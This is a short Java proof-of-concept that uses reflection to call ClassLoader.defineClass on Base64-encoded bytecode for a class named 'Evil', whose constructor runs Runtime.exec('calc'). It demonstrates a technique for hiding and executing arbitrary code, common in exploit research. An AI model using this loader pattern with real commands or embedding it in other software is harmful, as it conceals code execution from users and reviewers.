package classload;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.util.Base64;

public class classload {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException, InvocationTargetException {
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",String.class,byte[].class,int.class,int.class);
        defineClass.setAccessible(true);
        byte[] code = Base64.getDecoder().decode("yv66vgAAADEAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTEV2aWw7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAcACAcAGgwAGwAcAQAEY2FsYwwAHQAeAQAERXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAQABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAQABAAFAA0ABgALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQAAAAAgAR");
        Class Evil = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),"Evil",code,0,code.length);
        Evil.newInstance();
    }
}
